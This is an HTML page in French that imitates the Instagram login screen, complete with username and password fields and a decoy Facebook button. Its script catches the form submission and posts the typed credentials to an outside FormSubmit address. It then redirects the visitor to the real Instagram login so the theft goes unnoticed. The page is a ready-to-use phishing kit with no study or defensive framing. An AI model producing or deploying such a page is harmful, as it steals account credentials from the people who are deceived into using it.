<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Instagram</title>
<style>
  body {
    background: #000;
    color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: #121212;
    padding: 30px;
    border-radius: 8px;
    width: 320px;
    box-sizing: border-box;
  }
  h1 {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    font-size: 36px;
    font-weight: bold;
    margin: 0 0 20px 0;
    text-align: center;
  }
  label {
    display: block;
    margin: 12px 0 6px;
    font-size: 14px;
    font-weight: 500;
  }
  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 10px;
    background: #222;
    border: 1px solid #444;
    border-radius: 4px;
    color: #fff;
    font-size: 14px;
  }
  .password-wrapper {
    position: relative;
  }
  .toggle-password {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    width: 22px;
    height: 22px;
    fill: #aaa;
  }
  .facebook-btn {
    width: 100%;
    margin-bottom: 15px;
    padding: 10px;
    background: #1877f2;
    border: none;
    border-radius: 4px;
    color: white;
    font-weight: bold;
    font-size: 14px;
    cursor: pointer;
  }
  .separator {
    text-align: center;
    margin: 15px 0;
    color: #aaa;
    font-size: 13px;
  }
  button[type="submit"] {
    width: 100%;
    margin-top: 10px;
    padding: 10px;
    background: #3897f0;
    border: none;
    border-radius: 4px;
    color: white;
    font-weight: bold;
    font-size: 14px;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="container">
  <h1>Instagram</h1>

  <form id="instaForm" autocomplete="off">
    <button type="button" class="facebook-btn">Continuer avec Facebook</button>

    <div class="separator">─────── OU ───────</div>

    <label for="username">Téléphone, nom d’utilisateur ou e-mail</label>
    <input type="text" id="username" name="username" required />

    <label for="password">Mot de passe</label>
    <div class="password-wrapper">
      <input type="password" id="password" name="password" required />
      <svg class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
        <circle cx="12" cy="12" r="2.5"/>
      </svg>
    </div>

    <button type="submit">Se connecter</button>
  </form>
</div>

<script>
// Toggle visibilité mot de passe
const togglePassword = document.querySelector('.toggle-password');
const passwordInput = document.getElementById('password');

togglePassword.addEventListener('click', () => {
  const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
  passwordInput.setAttribute('type', type);
  togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
});

// Soumission AJAX vers FormSubmit et redirection vers Instagram
document.getElementById('instaForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const formData = new FormData(this);

  fetch("https://formsubmit.co/el/riyoye", {
    method: "POST",
    body: formData
  }).finally(() => {
    window.location.href = "https://www.instagram.com/accounts/login/";
  });
});
</script>

</body>
</html>
